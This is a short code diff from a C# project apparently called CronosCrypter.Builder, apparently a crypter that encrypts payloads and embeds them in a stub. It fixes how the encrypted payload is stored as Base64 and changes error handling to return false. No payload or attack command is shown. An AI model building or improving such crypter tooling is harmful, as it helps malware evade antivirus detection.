@@ -36,7 +36,6 @@ namespace CronosCrypter.Builder
             
             string updatedStub = Replace(Properties.Resources.Stub);
             byte[] enc = Encryption.Encrypt(payload, _settings.encryptionType , _settings.decryptKey);
-            _settings.encryptedPayload = enc.ToString();
             _settings.encryptedPayload = Convert.ToBase64String(enc);
 
             File.Create(_settings.resourceName).Close();
@@ -61,7 +60,7 @@ namespace CronosCrypter.Builder
                     Console.WriteLine();
                 }
                 MessageBox.Show("Found errors while encrypting");
-                Environment.Exit(1);
+                return false;
             }
             else
             {
